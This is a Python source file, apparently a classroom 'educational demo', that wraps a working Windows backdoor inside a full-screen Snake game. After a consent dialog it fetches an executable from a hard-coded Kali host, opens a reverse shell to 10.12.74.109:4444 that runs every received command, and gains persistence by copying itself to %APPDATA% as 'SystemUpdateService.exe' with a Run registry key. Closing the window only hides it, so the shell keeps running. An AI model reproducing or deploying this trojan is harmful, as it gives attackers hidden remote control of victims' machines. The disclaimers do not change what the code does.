""""
**EDUCATIONAL DEMO ONLY – Rwanda Coding Academy Assignment**
Use exclusively in isolated VMs. Never deploy on real systems.
This code demonstrates backdoor techniques for defense learning purposes.

Interactive Snake game with an educational backdoor demo. On consent:
- Checks/installs curl dependency from Kali HTTP server
- Establishes reverse shell to Kali listener (background thread)
- Adds persistence via %APPDATA% and Run key
- Runs a full‑screen Snake game. All in isolated VMs only.
"""

import os
import sys
import socket
import subprocess
import threading
import shutil
import urllib.request
import random

# Windows-only for persistence
if sys.platform == "win32":
    import winreg

# Tkinter for GUI
import tkinter as tk
from tkinter import messagebox, font as tkfont

# ============== CONFIGURATION – Replace with your Kali VM IP ==============
KALI_IP = "10.12.74.109"
KALI_PORT = 4444
KALI_HTTP_PORT = 8000
CURL_URL = f"http://{KALI_IP}:{KALI_HTTP_PORT}/curl.exe"
SYSTEM32 = os.path.join(os.environ.get("SystemRoot", "C:\\Windows"), "System32")
CURL_PATH = os.path.join(SYSTEM32, "curl.exe")
APPDATA_EXE_NAME = "SystemUpdateService.exe"
RUN_KEY_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"
OUTPUT_END_MARKER = b"\x00\x00\x00"


def get_self_path():
    """Path of running executable (or script)."""
    if getattr(sys, "frozen", False):
        return sys.executable
    return os.path.abspath(__file__)


def get_appdata_exe_path():
    return os.path.join(os.environ.get("APPDATA", ""), APPDATA_EXE_NAME)


# ---------- Consent dialog ----------
def show_consent():
    root = tk.Tk()
    root.withdraw()
    root.attributes("-topmost", True)
    msg = (
        "This is an EDUCATIONAL DEMO backdoor game for class only.\n\n"
        "It will:\n"
        "• Check/install dependencies (e.g. curl from instructor's VM)\n"
        "• Open a reverse shell to the instructor's Kali listener\n"
        "• Add itself to startup (persistence)\n"
        "• Run a full-screen Snake game\n\n"
        "All inside isolated VMs only. Do you consent?"
    )
    result = messagebox.askyesno("Educational Demo – Consent", msg, icon="question")
    root.destroy()
    return result


# ---------- Curl dependency ----------
def curl_available():
    try:
        subprocess.run(
            ["curl", "--version"],
            capture_output=True,
            timeout=5,
            creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0,
        )
        return True
    except (FileNotFoundError, subprocess.TimeoutExpired):
        return False


def download_curl():
    """Download portable curl.exe from Kali HTTP server (demo only). Tries System32, then %APPDATA%."""
    try:
        req = urllib.request.Request(CURL_URL)
        with urllib.request.urlopen(req, timeout=10) as resp:
            data = resp.read()
        for path in [CURL_PATH, os.path.join(os.environ.get("APPDATA", ""), "curl.exe")]:
            try:
                with open(path, "wb") as f:
                    f.write(data)
                return True
            except (OSError, PermissionError):
                continue
        return False
    except Exception:
        return False


def ensure_curl():
    if curl_available():
        return True
    return download_curl()


# ---------- Reverse shell (background thread) ----------
def reverse_shell():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((KALI_IP, KALI_PORT))
            while True:
                data = b""
                while b"\n" not in data:
                    chunk = s.recv(4096)
                    if not chunk:
                        raise ConnectionError("Connection closed")
                    data += chunk
                cmd = data.decode("utf-8", errors="replace").strip().split("\n")[0]
                if not cmd:
                    continue
                try:
                    result = subprocess.run(
                        cmd,
                        shell=True,
                        capture_output=True,
                        timeout=30,
                        cwd=os.environ.get("USERPROFILE", "."),
                        creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0,
                    )
                    out = (result.stdout or b"") + (result.stderr or b"")
                    if not out:
                        out = b"(command completed, no output)\n"
                except subprocess.TimeoutExpired:
                    out = b"(command timed out)\n"
                except Exception as e:
                    out = str(e).encode("utf-8") + b"\n"
                s.sendall(out + OUTPUT_END_MARKER)
        except Exception:
            pass
        try:
            import time
            time.sleep(5)
        except Exception:
            pass


# ---------- Persistence (Windows) ----------
def install_persistence():
    """Install persistence by copying to APPDATA and adding a Run key."""
    if sys.platform != "win32":
        return
    self_path = get_self_path()
    dest = get_appdata_exe_path()
    
    # Build the command that will be executed at startup
    if getattr(sys, 'frozen', False):
        # Frozen executable (e.g., PyInstaller) – run the .exe directly
        run_cmd = f'"{dest}" --background'
    else:
        # Running as a script – use the same Python interpreter
        python_exe = sys.executable
        run_cmd = f'"{python_exe}" "{dest}" --background'
    
    try:
        # Ensure the destination directory exists
        os.makedirs(os.path.dirname(dest), exist_ok=True)
        # Copy this script/executable to the destination
        shutil.copy2(self_path, dest)
        # Open the Run key for the current user
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            RUN_KEY_PATH,
            0,
            winreg.KEY_SET_VALUE,
        )
        # Set the value
        winreg.SetValueEx(key, "SystemUpdateService", 0, winreg.REG_SZ, run_cmd)
        winreg.CloseKey(key)
    except Exception as e:
        # Optional: log the error (for debugging in the lab)
        print(f"[!] Persistence installation failed: {e}")


# ---------- Snake game GUI ----------
class SnakeGameApp:
    """Simple Snake game.

    - Control the snake with arrow keys
    - Eat food to grow and increase score
    - Game ends if snake hits wall or itself
    - Press R to restart, Esc to hide
    """

    FIELD_COLOR = "#000000"
    SNAKE_COLOR = "#00ff00"
    FOOD_COLOR = "#ff0000"
    TEXT_COLOR = "#ffffff"

    def __init__(self):
        self.root = tk.Tk()
        self.root.title("Snake Game – Educational Demo")
        self.root.configure(bg=self.FIELD_COLOR)
        # Full-screen, always on top (no visible close button in typical fullscreen)
        self.root.attributes("-fullscreen", True)
        self.root.attributes("-topmost", True)
        # Closing / Escape hides the window but keeps process + backdoor alive
        self.root.protocol("WM_DELETE_WINDOW", self.hide_window)
        self.root.bind("<Escape>", lambda e: self.hide_window())

        self.width = self.root.winfo_screenwidth()
        self.height = self.root.winfo_screenheight()

        # Game grid settings
        self.cell_size = 30
        self.grid_width = self.width // self.cell_size
        self.grid_height = self.height // self.cell_size
        
        # Center the game area
        self.offset_x = (self.width - (self.grid_width * self.cell_size)) // 2
        self.offset_y = (self.height - (self.grid_height * self.cell_size)) // 2

        self.canvas = tk.Canvas(
            self.root,
            width=self.width,
            height=self.height,
            bg=self.FIELD_COLOR,
            highlightthickness=0,
        )
        self.canvas.pack(fill="both", expand=True)

        # Game state
        self.reset_game()
        
        # Bind keys
        self.root.bind("<KeyPress>", self.on_key_press)
        
        # Start game loop
        self.game_running = True
        self.game_loop()

    def reset_game(self):
        """Reset the game to initial state."""
        self.snake = [(self.grid_width // 2, self.grid_height // 2)]
        self.direction = (1, 0)  # Right
        self.next_direction = (1, 0)
        self.food = self.generate_food()
        self.score = 0
        self.game_over = False
        self.game_over_text = None
        self.draw_game()

    def generate_food(self):
        """Generate food at random position not occupied by snake."""
        while True:
            food = (random.randint(0, self.grid_width - 1), 
                   random.randint(0, self.grid_height - 1))
            if food not in self.snake:
                return food

    def hide_window(self):
        """Hide the game window but keep Tk mainloop and backdoor thread alive."""
        self.root.withdraw()

    def on_key_press(self, event):
        """Handle key presses."""
        if event.keysym == "r" or event.keysym == "R":
            self.reset_game()
            return
            
        if self.game_over:
            return
            
        # Change direction (prevent reversing)
        if event.keysym == "Up" and self.direction != (0, 1):
            self.next_direction = (0, -1)
        elif event.keysym == "Down" and self.direction != (0, -1):
            self.next_direction = (0, 1)
        elif event.keysym == "Left" and self.direction != (1, 0):
            self.next_direction = (-1, 0)
        elif event.keysym == "Right" and self.direction != (-1, 0):
            self.next_direction = (1, 0)

    def draw_game(self):
        """Draw the current game state."""
        self.canvas.delete("all")
        
        # Draw grid (optional, for visual reference)
        for i in range(self.grid_width + 1):
            x = self.offset_x + i * self.cell_size
            self.canvas.create_line(x, self.offset_y, x, self.offset_y + self.grid_height * self.cell_size,
                                   fill="#333333", width=1)
        for i in range(self.grid_height + 1):
            y = self.offset_y + i * self.cell_size
            self.canvas.create_line(self.offset_x, y, self.offset_x + self.grid_width * self.cell_size, y,
                                   fill="#333333", width=1)
        
        # Draw snake
        for i, segment in enumerate(self.snake):
            x, y = segment
            color = self.SNAKE_COLOR if i == 0 else "#00aa00"  # Head brighter
            self.canvas.create_rectangle(
                self.offset_x + x * self.cell_size + 2,
                self.offset_y + y * self.cell_size + 2,
                self.offset_x + (x + 1) * self.cell_size - 2,
                self.offset_y + (y + 1) * self.cell_size - 2,
                fill=color,
                outline=""
            )
        
        # Draw food
        if self.food:
            fx, fy = self.food
            self.canvas.create_oval(
                self.offset_x + fx * self.cell_size + 4,
                self.offset_y + fy * self.cell_size + 4,
                self.offset_x + (fx + 1) * self.cell_size - 4,
                self.offset_y + (fy + 1) * self.cell_size - 4,
                fill=self.FOOD_COLOR,
                outline=""
            )
        
        # Draw score
        self.canvas.create_text(
            self.width // 2,
            30,
            text=f"Score: {self.score}",
            fill=self.TEXT_COLOR,
            font=("Segoe UI", 24, "bold")
        )
        
        # Draw game over message
        if self.game_over:
            if self.game_over_text:
                self.canvas.delete(self.game_over_text)
            self.game_over_text = self.canvas.create_text(
                self.width // 2,
                self.height // 2,
                text=f"GAME OVER!\nFinal Score: {self.score}\nPress R to restart\nPress ESC to hide",
                fill=self.TEXT_COLOR,
                font=("Segoe UI", 36, "bold"),
                justify="center"
            )
        
        # Draw controls hint
        self.canvas.create_text(
            self.width // 2,
            self.height - 30,
            text="Arrow Keys: Move | R: Restart | ESC: Hide",
            fill=self.TEXT_COLOR,
            font=("Segoe UI", 12)
        )

    def update_game(self):
        """Update game state."""
        if self.game_over or not self.game_running:
            return
            
        # Update direction
        self.direction = self.next_direction
        
        # Calculate new head position
        head_x, head_y = self.snake[0]
        dx, dy = self.direction
        new_head = (head_x + dx, head_y + dy)
        
        # Check for collisions
        # Wall collision
        if (new_head[0] < 0 or new_head[0] >= self.grid_width or
            new_head[1] < 0 or new_head[1] >= self.grid_height):
            self.game_over = True
            self.draw_game()
            return
        
        # Self collision (excluding tail if we're about to move)
        if new_head in self.snake[:-1]:
            self.game_over = True
            self.draw_game()
            return
        
        # Add new head
        self.snake.insert(0, new_head)
        
        # Check if food eaten
        if new_head == self.food:
            self.score += 1
            self.food = self.generate_food()
            # Don't remove tail (snake grows)
        else:
            # Remove tail
            self.snake.pop()
        
        # Draw updated game
        self.draw_game()

    def game_loop(self):
        """Main game loop."""
        if self.game_running:
            self.update_game()
            # Move every 150ms
            self.root.after(150, self.game_loop)

    def run(self):
        self.root.mainloop()


# ---------- Main ----------
def main():
    # Background mode: used when started automatically from the Run key.
    # In this mode we do not show the quiz, only the reverse shell.
    if "--background" in sys.argv:
        t = threading.Thread(target=reverse_shell, daemon=True)
        t.start()
        # Keep the process alive with a simple loop.
        try:
            import time
            while True:
                time.sleep(60)
        except KeyboardInterrupt:
            pass
        return

    # Interactive mode: user launches the game manually and must consent.
    if not show_consent():
        sys.exit(0)
    ensure_curl()
    if sys.platform == "win32":
        install_persistence()
    t = threading.Thread(target=reverse_shell, daemon=True)
    t.start()
    app = SnakeGameApp()
    app.run()


if __name__ == "__main__":
    main()